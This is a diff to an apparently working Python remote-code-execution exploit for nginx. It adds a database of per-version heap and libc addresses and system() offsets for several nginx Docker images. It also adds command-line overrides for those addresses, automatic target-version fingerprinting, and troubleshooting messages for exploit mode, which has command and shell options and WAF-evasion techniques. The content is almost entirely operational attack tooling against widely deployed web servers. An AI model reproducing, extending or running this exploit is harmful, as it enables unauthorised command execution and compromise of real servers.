@@ -41,19 +41,100 @@ for _b in range(256):
     if not (_t[_b >> 5] & (1 << (_b & 0x1f))):
         SAFE.add(_b)
 
-# ─── Exploit constants (Docker image, ASLR disabled) ─────────────────────────
-HEAP_BASE        = 0x555555659000
-LIBC_BASE        = 0x7ffff77ba000
-SYSTEM_ADDR      = LIBC_BASE + 0x50d70
+# ─── Exploit constants ────────────────────────────────────────────────────────
+# Per-build database: maps nginx "Server:" version string → (HEAP_BASE, LIBC_BASE,
+# system_offset, PREREAD_HEAP_OFFSETS). Requires ASLR disabled on target.
+# Compute new entries with: python3 calibrate.py <host> <port> <worker_pid>
+KNOWN_BUILDS: dict = {
+    # nginx/1.25.3 — Docker nginx:1.25.3 (glibc/Debian, x86_64)
+    "nginx/1.25.3-glibc": {
+        "heap_base":  0x5555556cc000,
+        "libc_base":  0x7ffff77bb000,
+        "sys_offset": 0x4c490,
+        "offsets": [
+            0x05a427, 0x060e67,
+            0x0ba557, 0x0bf367, 0x0c4177, 0x0c8f87, 0x0cdd97,
+            0x0d2ba7, 0x0d79b7, 0x0dc7c7, 0x0e15d7, 0x0e63e7,
+            0x0eb1f7, 0x0f0007, 0x0f4e17, 0x0f9c27, 0x0fea37,
+            0x103847, 0x108657, 0x10d467,
+        ],
+    },
+    # nginx/1.29.5 — Docker nginx:1.29.5 (glibc/Debian, x86_64)
+    "nginx/1.29.5-glibc": {
+        "heap_base":  0x5555556e6000,
+        "libc_base":  0x7ffff7573000,
+        "sys_offset": 0x53110,
+        "offsets": [
+            0x05a427, 0x060e67,
+            0x0ba557, 0x0bf367, 0x0c4177, 0x0c8f87, 0x0cdd97,
+            0x0d2ba7, 0x0d79b7, 0x0dc7c7, 0x0e15d7, 0x0e63e7,
+            0x0eb1f7, 0x0f0007, 0x0f4e17, 0x0f9c27, 0x0fea37,
+            0x103847, 0x108657, 0x10d467,
+        ],
+    },
+    # nginx/1.26.3 — Docker nginx:1.26-alpine-slim (musl/Alpine, x86_64)
+    "nginx/1.26.3-musl": {
+        "heap_base":  0x555555686000,
+        "libc_base":  0x7ffff7f5c000,
+        "sys_offset": 0x449fd,
+        "offsets": [
+            0x05a427, 0x060e67,
+            0x0ba557, 0x0bf367, 0x0c4177, 0x0c8f87, 0x0cdd97,
+            0x0d2ba7, 0x0d79b7, 0x0dc7c7, 0x0e15d7, 0x0e63e7,
+            0x0eb1f7, 0x0f0007, 0x0f4e17, 0x0f9c27, 0x0fea37,
+            0x103847, 0x108657, 0x10d467,
+        ],
+    },
+    # Generic fallback — original research values (ASLR off, specific build)
+    "_default": {
+        "heap_base":  0x555555659000,
+        "libc_base":  0x7ffff77ba000,
+        "sys_offset": 0x50d70,
+        "offsets": [
+            0x05a427, 0x060e67,
+            0x0ba557, 0x0bf367, 0x0c4177, 0x0c8f87, 0x0cdd97,
+            0x0d2ba7, 0x0d79b7, 0x0dc7c7, 0x0e15d7, 0x0e63e7,
+            0x0eb1f7, 0x0f0007, 0x0f4e17, 0x0f9c27, 0x0fea37,
+            0x103847, 0x108657, 0x10d467,
+        ],
+    },
+}
+
+# Active constants (may be overridden by CLI flags or auto-selected by version)
+_build      = KNOWN_BUILDS["_default"]
+HEAP_BASE   = _build["heap_base"]
+LIBC_BASE   = _build["libc_base"]
+SYSTEM_ADDR = LIBC_BASE + _build["sys_offset"]
+
 FAKE_STRUCT_SIZE = struct.calcsize('<QQQ')
 
-PREREAD_HEAP_OFFSETS = [
-    0x05a427, 0x060e67,
-    0x0ba557, 0x0bf367, 0x0c4177, 0x0c8f87, 0x0cdd97,
-    0x0d2ba7, 0x0d79b7, 0x0dc7c7, 0x0e15d7, 0x0e63e7,
-    0x0eb1f7, 0x0f0007, 0x0f4e17, 0x0f9c27, 0x0fea37,
-    0x103847, 0x108657, 0x10d467,
-]
+PREREAD_HEAP_OFFSETS = _build["offsets"][:]
+
+
+def _apply_build(build_key: str | None, *, heap_base=None, libc_base=None,
+                 system_addr=None, offsets=None) -> None:
+    """Apply a known build profile or CLI overrides to the active constants."""
+    global HEAP_BASE, LIBC_BASE, SYSTEM_ADDR, PREREAD_HEAP_OFFSETS
+    if build_key and build_key in KNOWN_BUILDS:
+        b = KNOWN_BUILDS[build_key]
+        HEAP_BASE   = b["heap_base"]
+        LIBC_BASE   = b["libc_base"]
+        SYSTEM_ADDR = LIBC_BASE + b["sys_offset"]
+        PREREAD_HEAP_OFFSETS = b["offsets"][:]
+    if heap_base   is not None: HEAP_BASE   = heap_base
+    if libc_base   is not None: LIBC_BASE   = libc_base
+    if system_addr is not None: SYSTEM_ADDR = system_addr
+    if offsets     is not None: PREREAD_HEAP_OFFSETS = offsets[:]
+
+
+def _auto_select_build(version_str: str) -> str | None:
+    """Pick the best known-build key from the fingerprinted Server: header."""
+    for key in KNOWN_BUILDS:
+        if key == "_default": continue
+        ver_part = key.rsplit("-", 1)[0]   # e.g. "nginx/1.25.3"
+        if ver_part in version_str:
+            return key
+    return None
 
 VULN_MIN = (0, 6, 27)
 VULN_MAX = (1, 30, 0)
@@ -2523,6 +2604,16 @@ Usage examples
                     help="nginx location with a rewrite rule that captures $1 "
                          "(e.g. /r, /api, /search) — must match a 'rewrite … $1' "
                          "block in the target's nginx.conf (default: /api)")
+    tu.add_argument("--build", metavar="KEY",
+                    help=f"pre-computed build profile. known keys: "
+                         + ", ".join(k for k in KNOWN_BUILDS if k != "_default"))
+    tu.add_argument("--heap-base",   metavar="HEX",
+                    help="override HEAP_BASE (hex, e.g. 0x5555556cc000). "
+                         "Requires ASLR disabled on target.")
+    tu.add_argument("--libc-base",   metavar="HEX",
+                    help="override LIBC_BASE (hex)")
+    tu.add_argument("--system-addr", metavar="HEX",
+                    help="override address of system() (hex)")
 
     # ── Subdomain scan ────────────────────────────────────────────────────────
     sd = parser.add_argument_group("subdomain scan")
@@ -2636,6 +2727,23 @@ Usage examples
                     log("    Techniques: X-Forwarded-For/X-Real-IP spoof, UA rotation, "
                         "path obfuscation, header case randomisation")
 
+            # ── Apply build profile / CLI address overrides ───────────────────
+            if (args.cmd or args.cmd_file or args.shell) and not args.dry_run:
+                fp_ver = fingerprint_target(t_host, t_port, use_tls, args.proxy).get("server", "")
+                auto_key = _auto_select_build(fp_ver)
+                build_key = getattr(args, "build", None) or auto_key
+                if build_key:
+                    log(f"[*] Build profile : {build_key}")
+                _apply_build(
+                    build_key,
+                    heap_base   = int(args.heap_base,   16) if getattr(args, "heap_base",   None) else None,
+                    libc_base   = int(args.libc_base,   16) if getattr(args, "libc_base",   None) else None,
+                    system_addr = int(args.system_addr, 16) if getattr(args, "system_addr", None) else None,
+                )
+                log(f"[*] HEAP_BASE   = 0x{HEAP_BASE:x}")
+                log(f"[*] LIBC_BASE   = 0x{LIBC_BASE:x}")
+                log(f"[*] SYSTEM_ADDR = 0x{SYSTEM_ADDR:x}")
+
             # ── Exploit mode ──────────────────────────────────────────────────
             if (args.cmd or args.cmd_file or args.shell) and not args.dry_run:
                 if args.cmd_file:
@@ -2659,7 +2767,17 @@ Usage examples
 
                 candidates = get_candidates()
                 if not candidates:
-                    log("[!] No safe heap candidates.")
+                    log("[!] No URL-safe heap candidates for HEAP_BASE=0x"
+                        f"{HEAP_BASE:x}.")
+                    log("    The exploit encodes the preread-buffer address in the URI;")
+                    log("    all 6 bytes must pass nginx's NGX_ESCAPE_ARGS filter.")
+                    log("    Options:")
+                    log("      • Use --heap-base to set the correct value for your target")
+                    log("      • Use --build to select a pre-calibrated profile")
+                    log("      • Requires ASLR disabled on the target (PIE determinism)")
+                    log("      • Run calibrate.py locally against a target nginx worker to")
+                    log("        compute the right HEAP_BASE and connection pool offsets")
+                    list_candidates()
                     return 1
                 log(f"[*] {len(candidates)} safe candidates")
 
